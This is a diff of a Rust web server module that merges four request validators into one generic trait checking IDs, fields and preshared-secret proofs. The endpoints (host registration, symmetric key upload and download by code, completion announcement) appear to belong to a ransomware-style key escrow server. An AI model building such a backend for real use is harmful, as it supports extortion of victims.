@@ -6,7 +6,7 @@ use axum::{
 };
 use log::{debug, info, warn};
 
-use crate::{AppState, config};
+use crate::config;
 use coconut_crab_lib::web::{
     structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
     validate::{
@@ -17,208 +17,137 @@ use coconut_crab_lib::web::{
 #[derive(Debug)]
 pub struct Validated<T>(pub T);
 
-impl FromRequest<AppState> for Validated<Registration> {
-    type Rejection = (StatusCode, &'static str);
+type Rejection = (StatusCode, &'static str);
 
-    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
-        info!("Received request to register");
+pub trait Provable: serde::de::DeserializeOwned + Send {
+    const LABEL: &'static str;
+    fn id(&self) -> &str;
+    fn proof(&self) -> &str;
+    fn proof_source(&self) -> Vec<u8>;
+    fn validate_fields(&self) -> Result<(), Rejection>;
+}
 
-        let Json(registration) = match Json::<Registration>::from_request(req, state).await {
-            Ok(json) => json,
-            Err(error) => {
-                warn!("Failed to deserialize registration: {error}");
-                return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
-            }
-        };
-
-        if !validate_id(&registration.id) {
-            warn!("[] Invalid ID: {}", registration.id);
-            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
-        }
-
-        if !validate_hostname(&registration.hostname) {
-            warn!(
-                "[{}] Invalid Hostname: {}",
-                registration.id, registration.hostname
-            );
+impl Provable for Registration {
+    const LABEL: &'static str = "registration";
+    fn id(&self) -> &str {
+        &self.id
+    }
+    fn proof(&self) -> &str {
+        &self.proof
+    }
+    fn proof_source(&self) -> Vec<u8> {
+        [self.id.as_bytes(), self.hostname.as_bytes()].concat()
+    }
+    fn validate_fields(&self) -> Result<(), Rejection> {
+        if !validate_hostname(&self.hostname) {
+            warn!("[{}] Invalid Hostname: {}", self.id, self.hostname);
             return Err((StatusCode::BAD_REQUEST, "Invalid Hostname"));
         }
-
-        if !validate_proof(&registration.proof) {
-            warn!(
-                "[{}] Invalid Proof: {}",
-                registration.id, registration.proof
-            );
-            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
-        }
-
-        let proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
-        if !check_proof(&proof_source, config::PRESHARED_SECRET, &registration.proof) {
-            warn!(
-                "[{}] Proof Verification Failure: {}",
-                registration.id, registration.proof
-            );
-            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
-        }
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            registration.id, registration.proof
-        );
-
-        Ok(Self(registration))
+        Ok(())
     }
 }
 
-impl FromRequest<AppState> for Validated<UploadSymKey> {
-    type Rejection = (StatusCode, &'static str);
-
-    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
-        info!("Received request to upload symmetric key");
-
-        let Json(uploadsymkey) = match Json::<UploadSymKey>::from_request(req, state).await {
-            Ok(json) => json,
-            Err(error) => {
-                warn!("Failed to deserialize symmetric key upload: {error}");
-                return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
-            }
-        };
-
-        if !validate_id(&uploadsymkey.id) {
-            warn!("[] Invalid ID: {}", uploadsymkey.id);
-            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
-        }
-
-        if !validate_key(&uploadsymkey.key) {
-            warn!("[{}] Invalid Key: {}", uploadsymkey.id, uploadsymkey.key);
+impl Provable for UploadSymKey {
+    const LABEL: &'static str = "symmetric key upload";
+    fn id(&self) -> &str {
+        &self.id
+    }
+    fn proof(&self) -> &str {
+        &self.proof
+    }
+    fn proof_source(&self) -> Vec<u8> {
+        [self.id.as_bytes(), self.key.as_bytes()].concat()
+    }
+    fn validate_fields(&self) -> Result<(), Rejection> {
+        if !validate_key(&self.key) {
+            warn!("[{}] Invalid Key (len {})", self.id, self.key.len());
             return Err((StatusCode::BAD_REQUEST, "Invalid Key"));
         }
-
-        if !validate_proof(&uploadsymkey.proof) {
-            warn!(
-                "[{}] Invalid Proof: {}",
-                uploadsymkey.id, uploadsymkey.proof
-            );
-            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
-        }
-
-        let proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
-        if !check_proof(&proof_source, config::PRESHARED_SECRET, &uploadsymkey.proof) {
-            warn!(
-                "[{}] Proof Verification Failure: {}",
-                uploadsymkey.id, uploadsymkey.proof
-            );
-            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
-        }
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            uploadsymkey.id, uploadsymkey.proof
-        );
-
-        Ok(Self(uploadsymkey))
+        Ok(())
     }
 }
 
-impl FromRequest<AppState> for Validated<AnnounceCompletion> {
-    type Rejection = (StatusCode, &'static str);
-
-    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
-        info!("Received request to announce completion");
-
-        let Json(announcecompletion) =
-            match Json::<AnnounceCompletion>::from_request(req, state).await {
-                Ok(json) => json,
-                Err(error) => {
-                    warn!("Failed to deserialize completion announcement: {error}");
-                    return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
-                }
-            };
-
-        if !validate_id(&announcecompletion.id) {
-            warn!("[] Invalid ID: {}", announcecompletion.id);
-            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
-        }
-
-        if !validate_proof(&announcecompletion.proof) {
-            warn!(
-                "[{}] Invalid Proof: {}",
-                announcecompletion.id, announcecompletion.proof
-            );
-            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
-        }
-
-        let proof_source = announcecompletion.id.as_bytes().to_vec();
-        if !check_proof(
-            &proof_source,
-            config::PRESHARED_SECRET,
-            &announcecompletion.proof,
-        ) {
-            warn!(
-                "[{}] Proof Verification Failure: {}",
-                announcecompletion.id, announcecompletion.proof
-            );
-            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
-        }
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            announcecompletion.id, announcecompletion.proof
-        );
-
-        Ok(Self(announcecompletion))
+impl Provable for AnnounceCompletion {
+    const LABEL: &'static str = "completion announcement";
+    fn id(&self) -> &str {
+        &self.id
+    }
+    fn proof(&self) -> &str {
+        &self.proof
+    }
+    fn proof_source(&self) -> Vec<u8> {
+        self.id.as_bytes().to_vec()
+    }
+    fn validate_fields(&self) -> Result<(), Rejection> {
+        Ok(())
     }
 }
 
-impl FromRequest<AppState> for Validated<DownloadSymKey> {
-    type Rejection = (StatusCode, &'static str);
-
-    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
-        info!("Received request to download symmetric key");
-
-        let Json(downloadsymkey) = match Json::<DownloadSymKey>::from_request(req, state).await {
-            Ok(json) => json,
-            Err(error) => {
-                warn!("Failed to deserialize symmetric key download: {error}");
-                return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
-            }
-        };
-
-        if !validate_id(&downloadsymkey.id) {
-            warn!("[] Invalid ID: {}", downloadsymkey.id);
-            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
-        }
-
-        if !validate_code(&downloadsymkey.code) {
-            warn!(
-                "[{}] Invalid Code: {}",
-                downloadsymkey.id, downloadsymkey.code
-            );
+impl Provable for DownloadSymKey {
+    const LABEL: &'static str = "symmetric key download";
+    fn id(&self) -> &str {
+        &self.id
+    }
+    fn proof(&self) -> &str {
+        &self.proof
+    }
+    fn proof_source(&self) -> Vec<u8> {
+        [self.id.as_bytes(), self.code.as_bytes()].concat()
+    }
+    fn validate_fields(&self) -> Result<(), Rejection> {
+        if !validate_code(&self.code) {
+            warn!("[{}] Invalid Code: {}", self.id, self.code);
             return Err((StatusCode::BAD_REQUEST, "Invalid Code"));
         }
+        Ok(())
+    }
+}
 
-        if !validate_proof(&downloadsymkey.proof) {
-            warn!(
-                "[{}] Invalid Proof: {}",
-                downloadsymkey.id, downloadsymkey.proof
-            );
-            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
-        }
+fn ensure_id(id: &str) -> Result<(), Rejection> {
+    if !validate_id(id) {
+        warn!("[] Invalid ID: {id}");
+        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
+    }
+    Ok(())
+}
 
-        let proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
-        if !check_proof(
-            &proof_source,
-            config::PRESHARED_SECRET,
-            &downloadsymkey.proof,
-        ) {
-            warn!(
-                "[{}] Proof Verification Failure: {}",
-                downloadsymkey.id, downloadsymkey.proof
-            );
-            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
-        }
-        debug!(
-            "[{}] Proof Verification Success: {}",
-            downloadsymkey.id, downloadsymkey.proof
-        );
+fn ensure_proof_shape(id: &str, proof: &str) -> Result<(), Rejection> {
+    if !validate_proof(proof) {
+        warn!("[{id}] Invalid Proof: {proof}");
+        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
+    }
+    Ok(())
+}
 
-        Ok(Self(downloadsymkey))
+fn ensure_proof(id: &str, proof_source: &[u8], proof: &str) -> Result<(), Rejection> {
+    if !check_proof(proof_source, config::PRESHARED_SECRET, proof) {
+        warn!("[{id}] Proof Verification Failure: {proof}");
+        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
+    }
+    debug!("[{id}] Proof Verification Success: {proof}");
+    Ok(())
+}
+
+impl<T: Provable, S: Send + Sync> FromRequest<S> for Validated<T>
+where
+    Json<T>: FromRequest<S, Rejection = axum::extract::rejection::JsonRejection>,
+{
+    type Rejection = (StatusCode, &'static str);
+
+    async fn from_request(req: Request<Body>, state: &S) -> Result<Self, Self::Rejection> {
+        info!("Received request for {}", T::LABEL);
+        let value: T = Json::<T>::from_request(req, state)
+            .await
+            .map(|Json(value)| value)
+            .map_err(|error| {
+                warn!("Failed to deserialize {}: {error}", T::LABEL);
+                (StatusCode::BAD_REQUEST, "Invalid JSON")
+            })?;
+        ensure_id(value.id())?;
+        value.validate_fields()?;
+        ensure_proof_shape(value.id(), value.proof())?;
+        let proof_source = value.proof_source();
+        ensure_proof(value.id(), &proof_source, value.proof())?;
+        Ok(Self(value))
     }
 }
